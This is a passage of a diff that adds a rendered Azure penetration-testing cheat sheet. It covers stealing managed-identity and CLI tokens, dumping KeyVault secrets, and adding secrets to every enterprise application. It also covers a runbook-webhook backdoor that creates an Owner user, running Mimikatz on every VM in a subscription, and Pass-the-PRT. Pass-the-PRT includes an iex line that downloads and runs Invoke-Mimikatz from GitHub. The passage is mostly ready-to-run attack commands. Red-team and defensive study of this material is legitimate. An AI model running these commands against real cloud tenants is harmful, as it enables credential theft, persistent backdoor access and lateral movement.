+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">[+] Graph API&#34;</span>)
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;curl &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">?resource=https://graph.microsoft.com/&amp;api-version=2017-09-01&#34; -H secret:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(cmd)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>print(json<span style="color:#f92672">.</span>loads(val)[<span style="color:#e6db74">&#34;access_token&#34;</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;ClientID/AccountID: &#34;</span><span style="color:#f92672">+</span>json<span style="color:#f92672">.</span>loads(val)[<span style="color:#e6db74">&#34;client_id&#34;</span>])
+</span></span></code></pre></div><p>or inside a Python Function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> logging<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> azure.functions <span style="color:#66d9ef">as</span> func
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(req: func<span style="color:#f92672">.</span>HttpRequest) <span style="color:#f92672">-&gt;</span> func<span style="color:#f92672">.</span>HttpResponse:
+</span></span><span style="display:flex;"><span>    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Python HTTP trigger function processed a request.&#39;</span>)
+</span></span><span style="display:flex;"><span>    IDENTITY_ENDPOINT <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;IDENTITY_ENDPOINT&#39;</span>]
+</span></span><span style="display:flex;"><span>    IDENTITY_HEADER <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;IDENTITY_HEADER&#39;</span>]
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;curl &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">?resource=https://management.azure.com&amp;apiversion=2017-09-01&#34; -H secret:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+</span></span><span style="display:flex;"><span>    val <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(cmd)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> func<span style="color:#f92672">.</span>HttpResponse(val, status_code<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>)
+</span></span></code></pre></div><h3 id="get-tokens">
+  Get Tokens
+  <a class="anchor" href="#get-tokens">#</a>
+</h3>
+<p>:warning: The lifetime of a Primary Refresh Token is 14 days!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># az cli - get tokens </span>
+</span></span><span style="display:flex;"><span>az account get-access-token 
+</span></span><span style="display:flex;"><span>az account get-access-token --resource-type aad-graph
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or Az</span>
+</span></span><span style="display:flex;"><span>(Get-AzAccessToken -ResourceUrl https<span style="color:#960050;background-color:#1e0010">:</span>//graph.microsoft.com).Token
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT</span>
+</span></span></code></pre></div><h3 id="use-tokens">
+  Use Tokens
+  <a class="anchor" href="#use-tokens">#</a>
+</h3>
+<blockquote>
+<p>Tokens contain all the claims including that for MFA and Conditional Access</p>
+</blockquote>
+<ul>
+<li>Az Powershell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Tools&gt; $token = <span style="color:#e6db74">&#39;eyJ0e..&#39;</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Connect-AzAccount -AccessToken $token -AccountId &lt;ACCOUNT-ID&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Access Token and Graph Token</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $token = <span style="color:#e6db74">&#39;eyJ0eX..&#39;</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $graphaccesstoken = <span style="color:#e6db74">&#39;eyJ0eX..&#39;</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId &lt;ACCOUNT-ID&gt;
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Get-AzResource
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ERROR: &#39;this.Client.SubscriptionId&#39; cannot be null.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ---&gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI</span>
+</span></span></code></pre></div></li>
+<li>AzureAD
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module C:\Tools\AzureAD\AzureAD.psd1
+</span></span><span style="display:flex;"><span>$AADToken = <span style="color:#e6db74">&#39;eyJ0…&#39;</span>
+</span></span><span style="display:flex;"><span>Connect-AzureAD -AadAccessToken $AADToken -TenantId &lt;TENANT-ID&gt; -AccountId &lt;ACCOUNT-ID&gt;
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="refresh-tokens">
+  Refresh Tokens
+  <a class="anchor" href="#refresh-tokens">#</a>
+</h3>
+<ul>
+<li>
+  <a href="https://github.com/ConstantinT/Lantern">https://github.com/ConstantinT/Lantern</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Lantern.exe cookie --derivedkey &lt;Key from Mimikatz&gt; --context &lt;Context from Mimikatz&gt; --prt &lt;PRT from Mimikatz&gt;
+</span></span><span style="display:flex;"><span>Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename &lt;Name&gt; --outpfxfile &lt;Some path&gt;
+</span></span><span style="display:flex;"><span>Lantern.exe token --username &lt;Username&gt; --password &lt;Password&gt;
+</span></span><span style="display:flex;"><span>Lantern.exe token --refreshtoken &lt;RefreshToken&gt;
+</span></span><span style="display:flex;"><span>Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) 
+</span></span></code></pre></div></li>
+<li>
+  <a href="https://github.com/rvrsh3ll/TokenTactics">https://github.com/rvrsh3ll/TokenTactics</a>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\TokenTactics.psd1
+</span></span><span style="display:flex;"><span>CommandType     Name                                               Version    Source
+</span></span><span style="display:flex;"><span>-----------     ----                                               -------    ------
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Clear-Token                                        <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Dump-OWAMailboxViaMSGraphApi                       <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Forge-UserAgent                                    <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Get-AzureToken                                     <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Get-TenantID                                       <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Open-OWAMailboxInBrowser                           <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        Parse-JWTtoken                                     <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-AzureCoreManagementToken                 <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-AzureManagementToken                     <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-DODMSGraphToken                          <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-GraphToken                               <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-MAMToken                                 <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-MSGraphToken                             <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-MSManageToken                            <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-MSTeamsToken                             <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-O365SuiteUXToken                         <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-OfficeAppsToken                          <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-OfficeManagementToken                    <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-OutlookToken                             <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Function</span>        RefreshTo-SubstrateToken                           <span style="color:#ae81ff">0.0</span>.1      TokenTactics
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="stealing-tokens">
+  Stealing Tokens
+  <a class="anchor" href="#stealing-tokens">#</a>
+</h2>
+<ul>
+<li>Get-AzurePasswords
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module Microburst.psm1
+</span></span><span style="display:flex;"><span>Get-AzurePasswords
+</span></span><span style="display:flex;"><span>Get-AzurePasswords -Verbose | Out-GridView
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="stealing-tokens-from-az-cli">
+  Stealing tokens from az cli
+  <a class="anchor" href="#stealing-tokens-from-az-cli">#</a>
+</h3>
+<ul>
+<li>az cli stores access tokens in clear text in <strong>accessTokens.json</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
+<li>azureProfile.json in the same directory contains information about subscriptions.</li>
+</ul>
+<h3 id="stealing-tokens-from-az-powershell">
+  Stealing tokens from az powershell
+  <a class="anchor" href="#stealing-tokens-from-az-powershell">#</a>
+</h3>
+<ul>
+<li>Az PowerShell stores access tokens in clear text in <strong>TokenCache.dat</strong> in the directory <code>C:\Users\&lt;username&gt;\.Azure</code></li>
+<li>It also stores <strong>ServicePrincipalSecret</strong> in clear-text in <strong>AzureRmContext.json</strong></li>
+<li>Users can save tokens using <code>Save-AzContext</code></li>
+</ul>
+<h2 id="add-credentials-to-all-enterprise-applications">
+  Add credentials to all Enterprise Applications
+  <a class="anchor" href="#add-credentials-to-all-enterprise-applications">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Add secrets</span>
+</span></span><span style="display:flex;"><span>PS &gt; . C:\Tools\Add-AzADAppSecret.ps1
+</span></span><span style="display:flex;"><span>PS &gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use secrets to authenticate as Service Principal</span>
+</span></span><span style="display:flex;"><span>PS &gt; $password = ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;SECRET/PASSWORD&gt;&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS &gt; $creds = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;&lt;AppID&gt;&#39;</span>, $password)
+</span></span><span style="display:flex;"><span>PS &gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <span style="color:#e6db74">&#39;&lt;TenantID&gt;&#39;</span>
+</span></span></code></pre></div><h2 id="spawn-ssh-for-azure-web-app">
+  Spawn SSH for Azure Web App
+  <a class="anchor" href="#spawn-ssh-for-azure-web-app">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>az webapp create-remote-connection --subscription &lt;SUBSCRIPTION-ID&gt; --resource-group &lt;RG-NAME&gt; -n &lt;APP-SERVICE-NAME&gt;
+</span></span></code></pre></div><h2 id="azure-storage-blob">
+  Azure Storage Blob
+  <a class="anchor" href="#azure-storage-blob">#</a>
+</h2>
+<ul>
+<li>Blobs - <code>*.blob.core.windows.net</code></li>
+<li>File Services - <code>*.file.core.windows.net</code></li>
+<li>Data Tables - <code>*.table.core.windows.net</code></li>
+<li>Queues - <code>*.queue.core.windows.net</code></li>
+</ul>
+<h3 id="enumerate-blobs">
+  Enumerate blobs
+  <a class="anchor" href="#enumerate-blobs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS &gt; . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
+</span></span><span style="display:flex;"><span>PS &gt; Invoke-EnumerateAzureBlobs -Base &lt;SHORT DOMAIN&gt; -OutputFile azureblobs.txt
+</span></span><span style="display:flex;"><span>Found Storage Account -  testsecure.blob.core.windows.net
+</span></span><span style="display:flex;"><span>Found Storage Account -  securetest.blob.core.windows.net
+</span></span><span style="display:flex;"><span>Found Storage Account -  securedata.blob.core.windows.net
+</span></span><span style="display:flex;"><span>Found Storage Account -  securefiles.blob.core.windows.net
+</span></span></code></pre></div><h3 id="sas-url">
+  SAS URL
+  <a class="anchor" href="#sas-url">#</a>
+</h3>
+<ul>
+<li>Use 
+  <a href="https://azure.microsoft.com/en-us/features/storage-explorer/">Storage Explorer</a></li>
+<li>Click on <strong>Open Connect Dialog</strong> in the left menu.</li>
+<li>Select <strong>Blob container</strong>.</li>
+<li>On the <strong>Select Authentication Method</strong> page
+<ul>
+<li>Select <strong>Shared access signature (SAS)</strong> and click on Next</li>
+<li>Copy the URL in <strong>Blob container SAS URL</strong> field.</li>
+</ul>
+</li>
+</ul>
+<p>:warning: You can also use <code>subscription</code>(username/password) to access storage resources such as blobs and files.</p>
+<h3 id="list-and-download-blobs">
+  List and download blobs
+  <a class="anchor" href="#list-and-download-blobs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS Az&gt; Get-AzResource
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzStorageBlobContent -Container &lt;NAME&gt; -Context (Get-AzStorageAccount -name &lt;NAME&gt; -ResourceGroupName &lt;NAME&gt;).context -Blob
+</span></span></code></pre></div><h2 id="runbook-automation">
+  Runbook Automation
+  <a class="anchor" href="#runbook-automation">#</a>
+</h2>
+<h3 id="create-a-runbook">
+  Create a Runbook
+  <a class="anchor" href="#create-a-runbook">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check user right for automation</span>
+</span></span><span style="display:flex;"><span>az extension add --upgrade -n automation
+</span></span><span style="display:flex;"><span>az automation account list <span style="color:#75715e"># if it doesn&#39;t return anything the user is not a part of an Automation group</span>
+</span></span><span style="display:flex;"><span>az ad signed-in-user list-owned-objects
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If the user is not part of an &#34;Automation&#34; group.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add him to a custom group , e.g: &#34;Automation Admins&#34;</span>
+</span></span><span style="display:flex;"><span>Add-AzureADGroupMember -ObjectId &lt;OBJID&gt; -RefObjectId &lt;REFOBJID&gt; -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the role of a user on the Automation account</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Contributor or higher = Can create and execute Runbooks</span>
+</span></span><span style="display:flex;"><span>Get-AzRoleAssignment -Scope /subscriptions/&lt;ID&gt;/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Automation/automationAccounts/&lt;AUTOMATION-ACCOUNT&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># List hybrid workers</span>
+</span></span><span style="display:flex;"><span>Get-AzAutomationHybridWorkerGroup -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a Powershell Runbook</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Import-AzAutomationRunbook -Name &lt;RUNBOOK-NAME&gt; -Path C:\Tools\username.ps1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Type PowerShell -Force -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Publish the Runbook</span>
+</span></span><span style="display:flex;"><span>Publish-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the Runbook</span>
+</span></span><span style="display:flex;"><span>Start-AzAutomationRunbook -RunbookName &lt;RUNBOOK-NAME&gt; -RunOn Workergroup1 -AutomationAccountName &lt;AUTOMATION-ACCOUNT&gt; -ResourceGroupName &lt;RG-NAME&gt; -Verbose
+</span></span></code></pre></div><h3 id="persistence-via-automation-accounts">
+  Persistence via Automation accounts
+  <a class="anchor" href="#persistence-via-automation-accounts">#</a>
+</h3>
+<ul>
+<li>Create a new Automation Account
+<ul>
+<li>&ldquo;Create Azure Run As account&rdquo;: Yes</li>
+</ul>
+</li>
+<li>Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
+<ul>
+<li>Sample runbook for this Blog located here – 
+  <a href="https://github.com/NetSPI/MicroBurst">https://github.com/NetSPI/MicroBurst</a></li>
+<li>Publish the runbook</li>
+<li>Add a webhook to the runbook</li>
+</ul>
+</li>
+<li>Add the AzureAD module to the Automation account
+<ul>
+<li>Update the Azure Automation Modules</li>
+</ul>
+</li>
+<li>Assign &ldquo;User Administrator&rdquo; and &ldquo;Subscription Owner&rdquo; rights to the automation account</li>
+<li>Eventually lose your access…</li>
+<li>Trigger the webhook with a post request to create the new user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$uri = <span style="color:#e6db74">&#34;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&#34;</span>
+</span></span><span style="display:flex;"><span>$AccountInfo  = @(@{RequestBody=@{Username=<span style="color:#e6db74">&#34;BackdoorUsername&#34;</span>;Password=<span style="color:#e6db74">&#34;BackdoorPassword&#34;</span>}})
+</span></span><span style="display:flex;"><span>$body = ConvertTo-Json -InputObject $AccountInfo
+</span></span><span style="display:flex;"><span>$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="virtual-machine-runcommand">
+  Virtual Machine RunCommand
+  <a class="anchor" href="#virtual-machine-runcommand">#</a>
+</h2>
+<p>Requirements:</p>
+<ul>
+<li><code>Microsoft.Compute/virtualMachines/runCommand/action</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Get Public IP of VM : query the network interface</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzVM -Name &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; | select -ExpandProperty NetworkProfile
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzNetworkInterface -Name &lt;RESOURCE368&gt;
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Get-AzPublicIpAddress -Name &lt;RESOURCEIP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute Powershell script on the VM</span>
+</span></span><span style="display:flex;"><span>PS AzureAD&gt; Invoke-AzVMRunCommand -VMName &lt;RESOURCE&gt; -ResourceGroupName &lt;RG-NAME&gt; -CommandId <span style="color:#e6db74">&#39;RunPowerShellScript&#39;</span> -ScriptPath <span style="color:#e6db74">&#39;C:\Tools\adduser.ps1&#39;</span> -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connect via WinRM</span>
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $password = ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $creds = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;username&#39;</span>, $Password)
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; $sess = New-PSSession -ComputerName &lt;IP&gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+</span></span><span style="display:flex;"><span>PS C:\Tools&gt; Enter-PSSession $sess
+</span></span></code></pre></div><blockquote>
+<p>Allow anyone with &ldquo;Contributor&rdquo; rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># List available VMs</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; Get-AzureRmVM -status | where {$_.PowerState <span style="color:#f92672">-EQ</span> <span style="color:#e6db74">&#34;VM running&#34;</span>} | select ResourceGroupName,Name
+</span></span><span style="display:flex;"><span>ResourceGroupName    Name       
+</span></span><span style="display:flex;"><span>-----------------    ----       
+</span></span><span style="display:flex;"><span>TESTRESOURCES        Remote-Test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute Powershell script on the VM</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
+</span></span></code></pre></div><p>Against the whole subscription using MicroBurst.ps1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-module MicroBurst.psm1
+</span></span><span style="display:flex;"><span>Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
+</span></span></code></pre></div><h2 id="keyvault-secrets">
+  KeyVault Secrets
+  <a class="anchor" href="#keyvault-secrets">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># keyvault access token</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;</span>$IDENTITY_ENDPOINT<span style="color:#e6db74">?resource=https://vault.azure.net&amp;apiversion=2017-09-01&#34;</span> -H secret<span style="color:#960050;background-color:#1e0010">:</span>$IDENTITY_HEADER
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;</span>$IDENTITY_ENDPOINT<span style="color:#e6db74">?resource=https://management.azure.com&amp;apiversion=2017-09-01&#34;</span> -H secret<span style="color:#960050;background-color:#1e0010">:</span>$IDENTITY_HEADER
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># connect</span>
+</span></span><span style="display:flex;"><span>PS&gt; $token = <span style="color:#e6db74">&#39;eyJ0..&#39;</span>
+</span></span><span style="display:flex;"><span>PS&gt; $keyvaulttoken = <span style="color:#e6db74">&#39;eyJ0..&#39;</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-<span style="color:#ae81ff">8214</span>-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># query the vault and the secrets</span>
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzKeyVault
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault
+</span></span><span style="display:flex;"><span>PS Az&gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
+</span></span></code></pre></div><h2 id="pass-the-prt">
+  Pass The PRT
+  <a class="anchor" href="#pass-the-prt">#</a>
+</h2>
+<blockquote>
+<p>MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Run mimikatz to obtain the PRT</span>
+</span></span><span style="display:flex;"><span>PS&gt; iex (New-Object Net.Webclient).downloadstring(<span style="color:#e6db74">&#34;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&#34;</span>)
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;privilege::debug&#34; &#34;sekurlsa::cloudap&#34;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copy the PRT and KeyValue</span>
+</span></span><span style="display:flex;"><span>Mimikatz&gt; privilege::debug
+</span></span><span style="display:flex;"><span>Mimikatz&gt; token::elevate
+</span></span><span style="display:flex;"><span>Mimikatz&gt; dpapi::cloudapkd /keyvalue<span style="color:#960050;background-color:#1e0010">:</span>&lt;KeyValue&gt; /unprotect
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Copy the Context, ClearKey and DerivedKey</span>
+</span></span><span style="display:flex;"><span>Mimikatz&gt; dpapi::cloudapkd /context<span style="color:#960050;background-color:#1e0010">:</span>&lt;Context&gt; /derivedkey<span style="color:#960050;background-color:#1e0010">:</span>&lt;DerivedKey&gt; /Prt<span style="color:#960050;background-color:#1e0010">:</span>&lt;PRT&gt;
